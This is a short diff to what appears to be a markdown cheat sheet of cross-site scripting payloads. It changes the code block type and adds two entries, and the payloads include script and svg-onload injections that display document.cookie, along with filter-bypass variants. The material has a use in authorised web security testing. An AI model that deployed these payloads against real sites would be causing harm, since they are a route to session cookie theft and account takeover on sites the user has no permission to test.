@@ -21,7 +21,7 @@
 
 ## XSS Payloads <br>
 
-```html
+```txt
 <script>alert(document.domain+"\n\n"+document.cookie);<script>
 </script><svg><script/class=rodric>alert(1)</script>-%26apos;
 </SCRIPT>"><svg/OnLoad="`${prompt``}`">exemplo
@@ -35,6 +35,8 @@
 <svg onload=alert(1)<!--
 <svg/onload=window.alert();//
 <!--><svg/onload=window.alert();//
+"><img src =" x "oerror = " alert ('RodricBr); ">
+"><script><svg/alert%20(document.cookie)</script>
 ```
 
 ## XSS + SSRF <br>
